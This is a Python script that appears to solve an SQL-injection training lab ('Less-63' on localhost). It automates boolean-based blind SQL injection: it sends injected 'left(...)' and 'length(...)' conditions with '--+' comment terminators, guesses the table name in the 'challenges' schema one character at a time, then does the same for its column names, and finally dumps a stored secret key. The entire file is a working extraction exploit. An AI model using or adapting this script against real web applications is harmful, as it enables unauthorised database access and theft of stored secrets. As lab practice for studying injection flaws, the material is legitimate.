import requests
import string
import sys

def get_length(url, comment):
    s = requests.Session()
    for i in range(24, 1, -1):
        r = s.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if 'Your Password' in r:
            return i


def send(url):
    s = requests.Session()
    r = s.get(url).text
    if 'Your Password' in r:
        return True
    else:
        return False


alphabet = string.ascii_uppercase + '_0123456789' 
url = "http://localhost/Less-63/?id=1' and "

table_part1 = "left((select table_name FROM information_schema.tables where table_schema='challenges'),"
table_part2 = ")='"
comment = '--+'
length_table = "length((select table_name FROM information_schema.tables where table_schema='challenges'))="
count = 1
result = ""
tables = ""
data = ""
columns = []


length = get_length(url + length_table, comment)
for j in range(length):
    for c in alphabet:
        final_url = url + table_part1 + str(count) + table_part2 + (result+c) + "'" + comment
        # print(final_url)
        if send(final_url):
            count += 1
            result += c
            sys.stdout.write(c)
            sys.stdout.flush()
            # print (result)

# print(result)
sys.stdout.write("\r\n")
sys.stdout.flush()
tables = result
result = ""
count = 1

column_part1 = 'left((select column_name from information_schema.columns where table_name="{}" limit '.format(tables)
column_part2 = ',1),'
column_part3 = ')="'
length_column_part1 = 'length((select column_name from information_schema.columns where table_name="{}" limit '.format(tables)
length_column_part2 = ',1))='
for i in range(0, 4):
    length = get_length(url + length_column_part1 + str(i) + length_column_part2, comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + column_part1 + str(i) + column_part2 + str(count) + column_part3 + (result+c) + '"' + comment
            if send(final_url):
                count += 1
                result += c
                sys.stdout.write(c)
                sys.stdout.flush()
    
    sys.stdout.write("\r\n")
    sys.stdout.flush()
    columns.append(result)
    result = ""
    count = 1
dump_secret_key_part1 = 'left((select {} from challenges.{}),'.format(columns[2], tables)
dump_secret_key_part2 = ')="'
length_data = 'length((select {} from challenges.{}))='.format(columns[2].replace('SECRET','secret'), tables)

length_secret_key = get_length(url + length_data, comment)
for j in range(length_secret_key):
    for c in alphabet:
        final = url + dump_secret_key_part1 + str(count) + dump_secret_key_part2 + (result+c) + '"' + comment
        if send(final):
            count += 1
            result += c
            sys.stdout.write(c)
            sys.stdout.flush()
# print(result)
sys.stdout.write("\r\n")
sys.stdout.flush()
data = result
result = ""
count = 1


print("[+] Table: {}".format(tables))
print("[+] Column: {}".format(columns))
print("[+] Secret key: {}".format(data))
